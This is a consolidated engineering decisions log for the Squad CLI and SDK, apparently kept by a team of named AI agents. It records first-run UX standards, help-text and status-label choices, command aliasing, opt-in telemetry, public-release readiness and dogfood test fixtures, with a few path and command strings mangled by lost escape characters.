Brady's directive: "The impatient user bails at second 7."

Analysis of current first-run experience shows users bail at 0:18 (6 seconds after hitting enter) because:
- No feedback during SDK connection (5-second silence)
- Spinner with no context ("what is it doing?")
- Help text is a 50-line wall (can't find "how to start")

**Industry standard:** Modern CLIs (gh, docker, npm) provide instant feedback at every async operation. Squad matches this or loses users.

## What Changes

Filed 6 issues (#419-#423, #426) targeting first-30-second pain points:
- Help text structure (P0)
- SDK connection feedback (P0)
- Spinner context (P0)
- Default behavior clarity (P0)
- Welcome animation speed (P1)
- Tagline consistency (P1)

All P0 issues must be resolved before v1.0 release.

## Team Impact

- **Cheritto:** Welcome animation, spinner context
- **Fenster/Edie:** Help text structure
- **Kujan:** SDK connection status
- **Marquez:** UX review approval on PRs that touch first-run experience

# Decision: Help text: Progressive disclosure over overwhelming defaults

**When:** 2026-02-25
**Context:** Issues #419 and #424. \/help\ was showing 9 lines—overwhelming for new users in a terminal shell.
**Decision:** Split help into default (4 lines essentials) and \/help full\ (complete reference).

## Rationale

- **Cognitive load:** First-time users benefit from seeing the 3-5 most essential commands, not everything at once.
- **Self-serve:** Users who want details ask for them explicitly (\/help full\). This respects the user's agency.
- **Scannability:** 4 lines fit on one screen; 9 lines require scrolling or visual searching.
- **Consistency:** Matches CLI patterns like \git help\ (intro) vs \git help --all\ (everything).

## What changed

- Default \/help\: 4 lines (commands on 2 lines, callout to full help)
- \/help full\: 9 lines (everything, previous behavior)
- Terminal-width detection still applies to both

## Tone implications

- The callout "Type /help full for complete docs" is **not** a forced upsell. It's a quiet pointer.
- No marketing language ("discover more details!", "unlock advanced commands"). Just "if you need it, it's there."
- This pattern can apply to other shell commands later (e.g., \/status\ vs \/status detailed\).

## Files changed

- \packages/squad-cli/src/cli/shell/commands.ts\ — \handleHelp()\ function

# Decision: First 30 Seconds UX Standards (Waingro Hostile QA Assessment)

**Date:** 2026-02-24  
**Author:** Waingro (Hostile QA)  
**Status:** Proposed

## Context

During hostile QA testing of the first-time user journey (\squad --help\ → \squad init\ → \squad\ → first message), identified 3 P1 friction points that create bailout risk in the first 30 seconds:

1. **Stale root bundle** — \cli.js\ is v0.6.0-alpha.0, contradicts documented behavior
2. **Help wall of text** — 44 lines, 16 commands, user must scan to find 2 essential ones
3. **Dead air on launch** — 2-4 seconds of silence before welcome banner, no loading indicator

## Decision

Establish UX standards for the critical first 30 seconds:

### Standard 1: No Stale Entry Points

**Rule:** All CLI entry points must run from a single source of truth.

**Rationale:** Having multiple entry points (\cli.js\, \packages/squad-cli/dist/cli-entry.js\) with different versions creates confusion and violates principle of least surprise.

**Action:**
- Remove root \cli.js\ OR regenerate from latest source on every build
- Document canonical entry point clearly
- Add CI check to prevent version drift

### Standard 2: Help Respects Impatient Users

**Rule:** Default help shows ≤10 lines, covers 80% use case (getting started).

**Rationale:** First-time users need exactly 2 commands (\init\ and shell). Advanced commands (\scrub-emails\, \spire\, \plugin marketplace\) are noise at this stage.

**Action:**
- Split help into quick (default) and extended (\--all\)
- Quick help format:
  \\\
  squad v0.8.5.1

  Get started:
    squad init     Create your agent team
    squad          Launch interactive shell

  More:
    squad help --all    All commands
    squad doctor        Check setup
  \\\

**Comparison:** GitHub CLI \gh help\ shows 8 core commands, hides 20+ additional ones.

### Standard 3: No Dead Air Exceeding 1 Second

**Rule:** Any operation taking >1s must show progress feedback within 500ms.

**Rationale:** Dead silence creates "is this broken?" anxiety. Every second of silence increases bailout risk.

**Action:**
- Shell launch: print \◆ Loading squad...\ or spinner before Ink render
- First message: pre-warm SDK connection during shell initialization
- Init: skip animations in non-TTY, cap TTY animations to 500ms total

**Measurement:** Use speed gate tests to enforce thresholds.

## Issues Filed

- #417 (P1) — Stale root bundle
- #424 (P1) — Help wall of text
- #427 (P1) — Shell launch dead air
- #429 (P2) — Version format inconsistency
- #431 (P2) — Empty args behavior (defensible, low priority)

## Related Work

- #387, #395, #397, #399, #401 — Speed gates filed 2025-07-25
- Speed gate tests at \	est/speed-gates.test.ts\

## Success Metrics

**Before:**
- Help: 44 lines, 1331ms
- Shell launch: 2-4s dead air
- Root entry point: runs wrong command

**After:**
- Help: ≤10 lines (quick), 1331ms acceptable (Node.js startup floor)
- Shell launch: <1s to first feedback
- Single entry point, always correct behavior

## Review Requested

- **Marquez** (UX design) — approve help tier structure
- **Keaton** (Architect) — approve entry point consolidation strategy
- **Cheritto** (CLI lead) — implement loading indicators


### 2026-02-24T21:46:00Z: Unified status vocabulary

**By:** Marquez (CLI UX Designer)

**Decision:** Adopt the /agents command vocabulary — `[WORK]` / `[STREAM]` / `[ERR]` / `[IDLE]` — as the standard across ALL status surfaces. Replace AgentPanel's lowercase "streaming"/"working" and `[Active]` with this vocabulary.

**Rationale:**

Three status vocabularies currently exist:
- **AgentPanel compact:** `streaming` / `working` (lowercase text)
- **AgentPanel normal:** `[Active]` / `[Error]` (bracketed, collapsed)
- **/agents command:** `[WORK]` / `[STREAM]` / `[ERR]` / `[IDLE]` (bracketed, granular)

The /agents vocabulary wins because:

1. **Most granular.** It distinguishes between "streaming" (output flowing) and "working" (thinking/processing). AgentPanel collapses both into `[Active]`, losing critical information about *what type of work* is happening. Users need to know if an agent is still thinking or already returning results.

2. **NO_COLOR compatible.** Brackets work in monochrome terminals where only text styling is available. The emoji-based approach (● pulsing dots, ▶ arrow) requires color to be clear. Brackets are universally readable in 80x24 terminals and terminal emulators with color disabled.

3. **Text-over-emoji principle.** This respects the P2 decision in decisions.md: text status is primary, emoji is supplementary. `[STREAM]` is readable. ● alone is ambiguous. (● + text is best, ● alone in compact mode is worst.)

4. **Consistent across command context.** Users see `/agents` and AgentPanel simultaneously. When they see `[STREAM]` in the list and `[Active]` in the panel, it creates cognitive dissonance. One vocabulary everywhere eliminates friction.

5. **Future-proof for terminal edge cases.** Compact terminals (≤60 cols), SSH sessions with limited Unicode support, accessibility tools that strip ANSI codes — the bracket notation degrades gracefully in all cases.

**Implementation:**
- Replace AgentPanel compact status from `streaming`/`working` to `[STREAM]`/`[WORK]`
- Replace AgentPanel normal `[Active]` to match /agents format (use `[STREAM]` when `status === 'streaming'`, `[WORK]` when `status === 'working'`)
- Add `[ERR]` for error state (already present in /agents, missing in AgentPanel)
- Update test assertions for all three components (AgentPanel compact, normal, /agents command)

**Impact:** Reduces cognitive load for users scanning status across the shell interface. Makes Squad safer for use in low-color/accessibility-critical environments. No breaking changes to the /agents command output — only AgentPanel visuals change.


### 2026-02-24T21:45:00Z: Pick one tagline

**By:** Marquez (CLI UX Designer)

**Decision:** Use "Team of AI agents at your fingertips" everywhere.

**Rationale:** 

Both taglines work, but "Team of AI agents at your fingertips" wins on three counts:

1. **Outcome over action.** Users care about *what they can do* (have a team at their fingertips) not *what to do* (add a team). "Fingertips" paints a mental image of instant, direct control — the real promise.

2. **Shorter and punchier.** 7 words vs 8. Every character saved in a tagline compounds across help text, banners, and README. Brevity signals confidence.

3. **Existing use case consistency.** It's already in the help flow (line 71, `squad --help`). Help is the highest-intent page — users who see it are already convinced they want Squad. The help tagline should be the *lasting* memory, not the empty-args fallback.

The action tagline ("Add an AI agent team...") feels like feature description, not brand promise. It belongs in paragraph 2 of a marketing page, not at the top of help.

**Action:** Replace line 56 in cli-entry.ts with "Team of AI agents at your fingertips".

### 2026-02-24: Wave D Readiness & Batch 1 Prioritization
**By:** Keaton
**What:** Wave D (Delight) is ready to define. 13 P1–P2 gaps from Marquez UX and Waingro fragility catalogs, plus dogfood closure (#324) identified. Batch 1 prioritizes 3 P1 UX items (unified status display, adaptive keyboard hints, error recovery guidance) + 3 P2 hardening items (message history cap, per-agent streaming, streamBuffer cleanup). Batch 2 adds polish features. Batch 3 defers long-term hardening if timeline tight.
**Why:** Solid foundation (Waves A–C complete). Wave D turns it into something users *love* through precision, certainty, and memory safety hardening.
**Details:** See keaton-wave-d-assessment.md. Total effort: 20–25 hrs for Batch 1 (~4–5 PRs, 1 week). Dogfood testing closes last blocker before launch.
**Closes:** #410 (via PR #487)

## 2026-02-24: Public Readiness Assessment (consolidated)
**By:** Keaton, Fenster, Hockney, McManus, Rabin, Baer, Edie

### Context
Brady requested comprehensive public readiness assessment for Squad SDK + CLI source release. All 7 agents conducted independent reviews (architecture, code quality, testing, documentation, distribution, security, types).

### Consensus Verdict
🟡 **Ready with caveats** — All agents agree. Ship after 3 must-fixes (LICENSE file, CI workflow, debug console.logs). No blockers to source publication.

### Key Findings (Consolidated)

**Architecture & Core Dev (Keaton, Fenster):**
- Architecture is mature, production-grade, well-typed
- Feature set sufficient for v1 public release
- 2930 tests passing, builds clean
- P1 issue: 3 console.log statements in coordinator/index.ts (gate behind SQUAD_DEBUG env var or remove)

**Testing & Quality (Hockney):**
- Test quality is genuine: 2930 passing tests, 90.68% branch coverage
- Critical issue: CI workflow runs wrong test runner (node --test vs npm test) — false green
- Missing: real Copilot SDK integration tests (all tests mock CopilotClient)
- Action: Fix CI workflow, verify coverage config, add 1 integration test

**Documentation & Messaging (McManus):**
- Docs strong: README comprehensive, getting-started clear, API documented
- Tone clean: no hype, no overclaiming
- 3 critical issues (30 min to fix):
  1. No LICENSE file at repo root (package.json claims MIT)
  2. Status contradiction: README badge says "alpha", Status section says "Production"
  3. Broken link: CONTRIBUTING.md references non-existent CONTRIBUTORS.md

**Distribution & Packaging (Rabin):**
- Package metadata complete and correct
- Files field clean (no test fixtures, no src leakage)
- Security: zero npm audit vulnerabilities
- Nice-to-have: add homepage/bugs fields to package.json

**Security & Compliance (Baer):**
- No hardcoded secrets, no PII leaks
- Hook-based governance solid (file-write guards, shell restrictions, PII scrubbing all code-enforced)
- Dev dependency warning (minimatch ReDoS) is not in production code
- Action: Run npm audit fix after v0.8.5.1 published to npm

**Type System & Public API (Edie):**
- Strict mode enforced, zero @ts-ignore suppressions
- ESM-only, no CJS pollution
- 43 named exports, 18 subpath exports, clean public API
- Missing: noUncheckedIndexedAccess (acceptable for M1, add in M2)

### Must-Fixes (Consensus)
1. **LICENSE file** (McManus) — Create LICENSE at repo root with MIT text
2. **CI workflow** (Hockney) — Change .github/workflows/squad-ci.yml line 24 from 
ode --test test/*.test.js to 
pm test
3. **Debug console.logs** (Fenster) — Gate 3 coordinator console.log statements (lines 117, 122, 127) behind SQUAD_DEBUG env var or remove

### Nice-to-Have (Post-M1)
- Add homepage/bugs fields to packages/squad-sdk/package.json and packages/squad-cli/package.json
- Add 
oUncheckedIndexedAccess: true to tsconfig.json (Edie, M2)
- Tighten coordinator config types (Edie, post-M1)
- Add architecture overview doc (Keaton, 15-20 min)
- Document breaking change policy (Keaton)
- Close #324 dogfood testing (Keaton blocker, must close before Wave E)

### Risk Assessment
- **Low risk:** Code quality, architecture, security posture all solid
- **Medium risk:** API surface is alpha (breaking changes expected, but documented honestly)
- **Dependencies:** Clean, zero production vulnerabilities

### Recommendation
**🟢 Green-light public source release** after fixing 3 must-fixes. Estimated 1-2 hours to resolve. All agents agree: technical foundation is sound, presentation needs hygiene fixes only.

### What Happens Next
1. Fix must-fixes (1-2 hours)
2. Merge orchestration logs and consolidate decisions (Scribe)
3. Tag release and announce publicly
4. Post-publish: run npm audit fix, monitor #324 dogfood, gather external feedback
5. Wave E planning: Address must-fixes from live feedback, ship improvements

### 2026-02-24: User directive
**By:** Brady (via Copilot)
**What:** CLI docs should note that the project is experimental and ask users to file issues if they encounter problems.
**Why:** User request — captured for team memory

### 2026-02-24: Documentation readiness for public alpha release
**By:** McManus (DevRel)
**What:** Standardized documentation for public alpha release:
1. Created MIT LICENSE file at repo root with Brady Gaster and contributors as copyright holders
2. Added experimental/alpha warnings to all CLI docs (installation, shell, vscode) with consistent blockquote banner
3. Fixed README Status contradiction: changed from "🟢 **Production** — v0.6.0" to "⚠️ **Experimental** — v0.8.x alpha"
4. Fixed broken CONTRIBUTING link: corrected relative path from ../CONTRIBUTORS.md to CONTRIBUTING.md

**Why:** Makes public documentation honest, helpful, consistent, and functional. Signals alpha status clearly while maintaining friendly tone and enabling user feedback channels.



# Decision: Ghost Command Aliasing Strategy

**Author:** Fenster
**Date:** 2026-02-24
**Issues:** #501, #503, #504, #507, #509

## Context

Five commands were documented but had no CLI handlers: `hire`, `heartbeat`, `shell`, `loop`, `run`. Users hitting these got "Unknown command" errors.

## Decision

Wire them as aliases to existing functionality rather than building new features:

| Ghost Command | Resolution | Rationale |
|---------------|-----------|-----------|
| `squad hire` | Alias → `squad init` | Team creation = initialization |
| `squad heartbeat` | Alias → `squad doctor` | Health check already exists |
| `squad shell` | Explicit launch → `runShell()` | Same as no-args behavior, but explicit |
| `squad loop` | Alias → `squad triage` | Work monitoring = triage |
| `squad run <agent>` | Stub with "coming soon" message | Non-trivial to implement properly; directs users to REPL |

## Rationale

- **Minimal code change:** Each alias is 1-2 lines in the command router.
- **No new dependencies:** All aliases reuse existing implementations.
- **`run` is deferred:** Proper agent dispatch outside the REPL requires session lifecycle changes. A stub with a helpful message is better than a broken implementation.
- **Backwards compatible:** No existing commands were changed.

## Impact

- CLI help text updated to show all five commands.
- Users can now use the documented names without confusion.
- `squad run` will need a real implementation in a future PR when non-interactive agent dispatch is ready.



### Per-command --help/-h: intercept-before-dispatch pattern
**By:** Fenster (Core Dev)
**Date:** 2025-07-14
**PR:** #533
**Closes:** #511, #512

**What:** All CLI subcommands now support `--help` and `-h` flags. Help is intercepted in a single block *before* the command routing switch, so destructive commands (like `squad init`) never execute when help is requested.

**Why:** Brady reported that `squad init --help` actually ran init instead of showing help. This is a safety issue — users expect `--help` to be non-destructive. The intercept-before-dispatch pattern guarantees no side effects.

**Convention:** Any new CLI command added to the router MUST have a corresponding entry in the `getCommandHelp()` map in `cli-entry.ts`. Help text should include: usage line, 1-2 sentence description, options, and at least 2 examples.

**Source:** Draft help text from `.squad/agents/fenster/cli-command-inventory.md`.


# Decision: Watch uses SDK triage subpath

- Date: 2026-02-27
- Owner: Fenster
- Context: packages/squad-cli/src/cli/commands/watch.ts needed to adopt routing-aware triage from SDK.

## Decision
Use direct SDK subpath import @bradygaster/squad-sdk/ralph/triage and add ./ralph/triage to packages/squad-sdk/package.json exports.

## Rationale
- Keeps triage logic centralized in SDK and avoids duplicate parsing/matching code in CLI.
- Preserves explicit access to triage helpers without broadening ralph/index.ts public surface unnecessarily.
- Minimal change to existing CLI control flow (copilot auto-assign, polling, shutdown unchanged).


# Decision: Ralph Smart Triage Module — Architecture Review

**Date:** 2026-02-25
**Author:** Keaton (Lead)
**Verdict:** ✅ APPROVED

## Files Reviewed

1. `packages/squad-sdk/src/ralph/triage.ts` — NEW
2. `packages/squad-cli/src/cli/core/gh-cli.ts` — MODIFIED
3. `packages/squad-sdk/src/agents/onboarding.ts` — MODIFIED
4. `packages/squad-sdk/src/config/init.ts` — MODIFIED

## Architecture Assessment

**triage.ts** is well-architected:
- **Pure functions, zero side effects** — parsing and triage logic has no I/O, no network calls. CLI reads files; SDK just decides. Follows SDK's pure-library ethos.
- **Correct priority cascade:** module ownership → routing rules → role keywords → lead fallback. This matches how real triage works — specific path mentions are strongest signal, generic keywords are weakest.
- **Parses actual routing.md format correctly** — verified regex against real `## Work Type → Agent` header (including unicode arrow), column name matching against actual headers, emoji handling in agent names via `normalizeName()`.
- **Parses actual team.md format correctly** — `## Members` section found, Name/Role columns extracted, Scribe/Ralph correctly excluded from assignable roster.
- **normalizeEol dependency exists** — confirmed at `packages/squad-sdk/src/utils/normalize-eol.ts`. Critical for Windows cross-platform parsing.
- **Interfaces are extensible** — `TriageDecision.source` union, confidence levels, decoupled `TriageIssue` (not tied to `GhIssue`).

**gh-cli.ts GhPullRequest** covers Ralph's PR monitoring needs: number, title, author, labels, isDraft, reviewDecision, state, headRefName, statusCheckRollup.

**onboarding.ts and init.ts** — Ralph charter/description updates from "Persistent Memory Agent" to "Work Monitor" are consistent and accurate.

## Minor Suggestions (Non-blocking)

1. **Emoji in RoutingRule.agentName:** `parseRoutingRules` stores raw values like `"Fenster 🔧"` — normalization only happens during `findMember`. Consider stripping emoji at parse time so stored values are clean.
2. **GhPullRequest missing `createdAt`/`updatedAt`:** Ralph will need these for staleness detection. Add in next iteration.
3. **`findRoleKeywordMatch` takes first match:** If multiple members share a role keyword (e.g., Hockney=Tester, Breedan=E2E Test Engineer), first wins. Acceptable since routing rules (higher priority) catch specific cases.
4. **Role keyword matching is hardcoded to frontend/backend/test:** Doesn't leverage project-specific roles (Prompt Engineer, SDK Expert). Fine as a fallback — routing rules handle specifics.

## Decision

Approved for merge. Architecture compounds — pure parsing + typed decisions + priority cascade means future triage features (label-based routing, PR auto-assignment, staleness alerts) can layer on without restructuring.



# Replatform Readiness Assessment (Brady Handoff)

**Date:** 2026-02-27T23:30:00Z  
**Author:** Keaton (Lead)  
**Status:** DECISION — Ready to ship v1 public alpha  

---

## Context

Brady asked: "We gotta get this thing moved over" — meaning the v1 replatform from squad-beta to squad-pr as public alpha. Keaton assessed full project state: codebase, tests, open issues, open PRs, readiness to launch.

---

## Executive Summary

**🟡 READY WITH ONE CRITICAL BLOCKER**

- **Codebase:** Solid. 2944 tests passing (1 environmental failure). Clean build. No technical debt blocking launch.
- **Distribution:** Proven. Both packages published to npm (v0.8.5.1). Quick-start path works.
- **Messaging:** Clear. Alpha status in README. Experimental warnings in place.
- **BLOCKER:** Issue #532 (dogfood testing). Must close before replatform launch for confidence.
- **External PRs:** 3 quality PRs from contributors (Sturtevant, Boyer, Dresher). One (#552 Ralph triage) ready to merge. Two others for Wave E.
- **Timeline:** Close #532 (1-2 days), merge #552 (today), replatform launch (Feb 28 or Mar 1).

---

## Detailed Assessment

### 1. Codebase State ✅

**Build**
- `npm run build -w packages/squad-sdk`: Compiles cleanly in <3s. Zero errors.
- Both packages (squad-sdk v0.8.5.1, squad-cli v0.8.5.1) are up-to-date.
- TypeScript strict mode enforced. No `@ts-ignore` violations.

**Tests**
- **Total:** 2944 passing, 1 failing, 2 skipped, 1 todo.
- **Failure:** aspire-integration.test.ts (docker pull timeout). Environmental, not code. Safe to ignore for replatform.
- **Passing tests:** Comprehensive. 57 test files. Coverage across SDK modules, CLI, E2E, hostile QA, accessibility.
- **Runtime:** 51.39s. Fast feedback loop.
- **Quality:** High. 2930+ core tests passing. Flakiness is minimal (docker dependency, not code).

**Git History**
- HEAD = dev (same as origin/main).
- 6 recent commits (samples, docs, CLI help, ghost commands, OTel, Ctrl+C). All shipped.
- No open PRs on main. Workspace clean (only .squad/agents/kobayashi/history.md unstaged — non-blocking).

**Architecture**
- SDK/CLI split complete. Clean one-way DAG (CLI → SDK → @github/copilot-sdk).
- 18+ SDK subpath exports. Module boundaries clear.
- Hook-based governance (not prompt-based). Hook system proven.
- No architectural debt. All major systems integrated and tested.

---

### 2. Open Issues (2 total, 1 is BLOCKER) ⚠️

**#532 — Dogfood REPL against real-world repositories (P0) — 🔴 BLOCKER**
- **Assigned:** Waingro + Hockney
- **What:** Test REPL against 4 repo types: fresh init, existing squadded, monorepo, solo.
- **Why critical:** Only open issue blocking replatform confidence. No other issues pending.
- **Recommendation:** Close this week. Brady + Waingro priority.

**#542 — GitHub Project Board automation (P1-ish) — 🟡 NICE-TO-HAVE**
- **Assigned:** Hockney
- **What:** `squad board` CLI command + `sync-board.yml` workflow. 6 board columns. Well-designed.
- **Why defer:** Scope is clean but not critical to replatform launch. Wave E feature.
- **Recommendation:** Queue for Wave E. Hockney can start after replatform stabilizes.

---

### 3. Open PRs (3 total, from external contributors) 📊

**#552 — Ralph Routing-Aware Triage (Shayne Boyer) — 🟢 MERGE IMMEDIATELY**
- **Scope:** 12596 additions, 32 files, -10061 net deletions (refactor).
- **What:** Ralph's heartbeat + watch now read routing.md (smart triage, no dumb keywords).
- **Tests:** 57 tests across 3 files. All passing.
- **Quality:** High. Reviewed by Keaton. Code is solid. Unblocks Ralph for real work.
- **Recommendation:** Merge today. Safe and valuable.

**#553 — Personal Squad Consult Mode (James Sturtevant) — 🟡 SHIP IN WAVE E**
- **Scope:** 850 additions, 3 files. PRD exists.
- **What:** Portable personal squads (isolated workflows).
- **Tests:** Present. PRD quality good.
- **Why defer:** Good feature but not critical to replatform launch. Adds complexity.
- **Recommendation:** Merge in Wave E after replatform stabilizes + community feedback in.

**#547 — Squad Remote Control (Tamir Dresher) — 🟡 SHIP IN WAVE E**
- **Scope:** 2885 additions, 19 files. 18 tests passing.
- **What:** PTY+WebSocket+devtunnel for phone/browser access to CLI session.
- **Quality:** Solid. Novel feature. Blog post published.
- **Why defer:** Wave E feature. Not blocking replatform.
- **Recommendation:** Merge in Wave E. Ship as bonus after public alpha stabilizes.

- Contributor guide: Solid (CONTRIBUTING.md).
- Support model: GitHub issues + discussions (appropriate for alpha).
- No messaging blockers.

## Critical Blocker & Risk Mitigation

### BLOCKER: #532 (Dogfood) 🔴
- **Must close before replatform launch.**
- **Impact:** Without dogfooding, we ship to public without confidence in real-world usage.
- **Mitigation:** Brady + Waingro close this week (Feb 28). Test against 4 repo types. Document findings.
- **Confidence gate:** "We've tested on fresh projects, monorepos, and existing squadded repos — all work."

### Secondary Risk: Observer Effects from External PRs
- **#553 + #547 are quality PRs but add complexity.** Recommend deferring both to Wave E.
- **Mitigation:** Merge #552 (Ralph triage) only. Hold the other two. Reduces surface area at launch.

### Post-Launch Risks (Not Blockers)
- **Observability:** OTel integration is not critical for alpha. Plan for Wave F (production use case).
- **UX debt:** Marquez's UX audit findings + dogfood findings will drive Wave E. Expected and healthy.
- **Community feedback:** Assume 15-20 issues will surface in first week of public use. Plan to triage + prioritize.

---

## Concrete Timeline

### Today (Feb 27)
- Merge #552 (Ralph triage). Safe. Tests pass. Keaton reviewed.
- Start #532 (dogfood). Brady + Waingro begin testing against 4 repo types.

### Tomorrow (Feb 28)
- Close #532. Document findings.
- Tag v0.8.5.1 for public release (if not already done).
- Update repo description/settings for public alpha messaging.

### Feb 28 or Mar 1
- **REPLATFORM LAUNCH:** Announce to beta users + GitHub Copilot team.
- Public alpha available at `npm install -g @bradygaster/squad-cli`.
- Issue #553, #547 queued for Wave E (post-launch).

### Wave E (Post-Launch, 1-2 weeks)
- Dogfood findings triage.
- Marquez UX audit implementation.
- Community feedback iteration.
- Merge #553 + #547 (personal consult + remote control).
- Plan observability (Wave F).

---

## Decision

### APPROVE Replatform Launch ✅

**Contingency:** #532 (dogfood) must close first. No other blockers.

**Scope:**
- Close #532 (Waingro/Brady).
- Merge #552 (Boyer's Ralph triage).
- Ship v0.8.5.1 public alpha.
- Queue #553 + #547 for Wave E.

**Success Metrics:**
- Public launch announcement (by Mar 1).
- 0 critical bugs in first week (2944 tests + dogfood coverage gives us confidence).
- 5-10 community issues logged (healthy for alpha).
- Clear wave planning for Wave E based on feedback.

# Decision: REPL cancellation and configurable timeout

**Author:** Kovash  
**Date:** 2026-02-25  
**PR:** #538  
**Issues:** #500, #502

## Context

The REPL had two UX friction points: (1) Ctrl+C during streaming left the shell locked because `processing` wasn't reset, and (2) the 10-minute session timeout was hardcoded.

## Decisions

1. **Ctrl+C immediately resets `processing` state** — `setProcessing(false)` is called alongside `onCancel()` in App.tsx's Ctrl+C handler, so the InputPrompt re-enables instantly. The async session abort still runs in background.

2. **Timeout configuration uses `SQUAD_REPL_TIMEOUT` env var (seconds)** — Precedence: `SQUAD_REPL_TIMEOUT` → `SQUAD_SESSION_TIMEOUT_MS` (SDK-level, milliseconds) → 600000ms default. The `--timeout` CLI flag sets the env var before shell launch.

## Impact

- All shell components: Ctrl+C behavior change affects InputPrompt, ThinkingIndicator
- CLI entry point: new `--timeout` flag
- SDK: no changes (existing `SQUAD_SESSION_TIMEOUT_MS` env var preserved as fallback)



# Decision: Shell Observability Metrics Design

**Author:** Saul (Aspire & Observability)
**Date:** 2026-02-24
**Issues:** #508, #520, #526, #530, #531

## Context

Five overlapping issues requested telemetry instrumentation of the REPL shell: session lifetime, agent response latency, error rate tracking, and basic retention metrics. The SDK already had OTel infrastructure (Phases 1–4), but no user-facing shell metrics.

## Decision

### Metrics Added (all under `squad.shell.*` namespace)

| Metric | Type | Unit | Description |
|--------|------|------|-------------|
| `squad.shell.session_count` | Counter | — | Incremented once per shell session start (retention proxy) |
| `squad.shell.session_duration_ms` | Histogram | ms | Recorded on shell exit with total session lifetime |
| `squad.shell.agent_response_latency_ms` | Histogram | ms | Time from message dispatch to first visible response token |
| `squad.shell.error_count` | Counter | — | Errors during dispatch (agent, coordinator, general) |

### Opt-in Gate

**All shell metrics are gated behind `SQUAD_TELEMETRY=1`** — not just the OTLP endpoint. This is a stronger privacy guarantee than the SDK-level metrics (which activate whenever `OTEL_EXPORTER_OTLP_ENDPOINT` is set). Rationale: shell metrics describe user behavior patterns, so they require explicit consent.

### Architecture

- New module: `packages/squad-cli/src/cli/shell/shell-metrics.ts`
- Uses `getMeter('squad-shell')` from SDK — shares the same MeterProvider and OTLP pipeline
- Wired into `runShell()` lifecycle in `index.ts`
- Latency measured at first `message_delta` event (first visible token), not at connection time
- No PII collected — only agent names, dispatch types, and timing data

### Alternatives Considered

1. **SDK-level only** — Rejected because SDK metrics track API sessions, not user-visible experience
2. **Separate OTLP endpoint for shell** — Over-engineered; sharing the SDK's MeterProvider is simpler
3. **Always-on with OTLP endpoint** — Rejected for privacy; shell metrics need explicit opt-in

## Impact

- 18 new tests covering all metrics + opt-in gating
- Zero impact when `SQUAD_TELEMETRY` is unset (no instruments created)
- Compatible with existing Aspire dashboard — metrics appear under `squad-shell` meter

### 2026-02-25: Issue #532 Analysis: Dogfooding Gap — REPL Testing Against Real-World Repos
**By:** Keaton (Lead)
**Issue:** #532 — Resolve dogfooding gap — test REPL against real-world repositories
**Labels:** squad:hockney, squad:waingro, go:needs-research
**Status:** ANALYSIS COMPLETE — Ready for decomposition into sub-tasks
**Created:** 2026-02-25

## Executive Summary

Issue #532 is correctly scoped as a **research + testing initiative**, NOT a feature build. The REPL itself is complete (shipped in Waves A–C). What's missing is **confidence** that it works on real codebases — not test-fixtures. The issue has no concrete acceptance criteria or test scenarios defined.

**Key Finding:** Existing test suite covers:
- ✅ REPL UX rendering (e2e-shell, repl-ux)
- ✅ Shell lifecycle & input routing (shell-integration, cli-shell-comprehensive)
- ✅ Hostile input handling (hostile-integration, ~95 nasty strings)
- ✅ Human journeys on mocked repos (human-journeys)
- ❌ **Real-world repository interaction** — Testing against actual diverse codebases (Python, Node, Go, Rust, Java, monorepo, etc.)
- ❌ **Edge cases in real code** — Parsing large files, deeply nested projects, non-UTF8 encodings, symlink chains, missing tooling

## Scope

- **5–8 real-world repositories** (Python, Node, Go, monorepo, mixed-language, edge cases)
- **Test harness** created (	est/repl-dogfood.test.ts)
- **Manual dogfood execution** (Waingro + Hockney)
- **Metrics capture** (response time, tokens, errors)
- **Effort estimate:** ~10–12 hours (2–3 people, 2–3 days)

## Routing

Assign to **Waingro** (primary dogfooder) + **Hockney** (test implementation).

### 2026-02-24: Decision: Dogfood Test Fixtures Architecture
**Date:** 2026-02-24
**Author:** Waingro (Hostile QA)
**Issue:** #532 (Resolve dogfooding gap — test REPL against real-world repositories)
**Branch:** squad/532-dogfood-repl

## Situation

The Squad REPL needed comprehensive dogfooding scenarios to test against real-world project patterns. Without test fixtures, hostile QA was flying blind — no way to verify REPL behavior across Python, Node.js, Go, mixed-language, deeply nested, minimal, large-team, or corrupt-state scenarios.

## Decision

Created two deliverables:

1. **Scenarios Document** (\	est-fixtures/dogfood-scenarios.md\)
   - 8 scenarios covering the spectrum of real-world projects
   - Each with "Why it matters", expected behavior, edge cases, and pass/fail criteria
   - Designed to be human-readable (not machine-executed)

2. **Fixture Directories** (\	est-fixtures/dogfood/*/\)
   - 8 minimal-but-realistic project structures
   - Each includes actual code (Flask routes, Go structs, React components)
   - Properly initialized with \.squad/\ directories and agent charters
   - Corrupt-state fixture intentionally breaks schema (missing header, invalid JSON)

## Rationale

### Why Realistic Content Matters
- **Lazy fixture creation** (empty dirs, placeholder files) teaches us nothing
- Real \.squad/team.md\ parsing, real \go.mod\ parsing, real monorepo workspace logic
- Discovery bugs only show up with actual file structures
- Regression testing needs to use the same projects that exposed the bug

### Why Separate Scenarios Document
- Hostile QA tests are not code—they're **stories with acceptance criteria**
- Gherkin features describe "what the user does"; scenarios document "what the REPL needs to handle"
- Each scenario is a test case you can run manually, not an automated test
- Scenarios include "edge cases to watch" — guidance for what to look for, not assertions

### Why 8 Scenarios (Not 3, Not 20)
- **3 is too few:** Misses critical patterns (workspaces, nested depth, many agents, corrupt state)
- **20 is too many:** Test fatigue; fixtures become unmaintainable; most scenarios are variants
- **8 covers the matrix:**
  - Single-language (Python) vs. multi-language (TS+Python)
  - Small team (2 agents) vs. large team (20 agents)
  - Happy path (minimal, Python, monorepo) vs. edge cases (deep nesting, corrupt state)
  - Full structure (Flask, Go, Node) vs. degenerate (minimal repo, empty .squad/)

## Impact
✅ **Hostile QA can now dogfood against 8 realistic project patterns**
✅ **Regressions become fixtures — if a bug is found, add an edge case to the appropriate scenario**
✅ **Team has clear "what to test" guidance without needing to design new projects**
✅ **Corrupt-state fixture enforces graceful degradation culture**
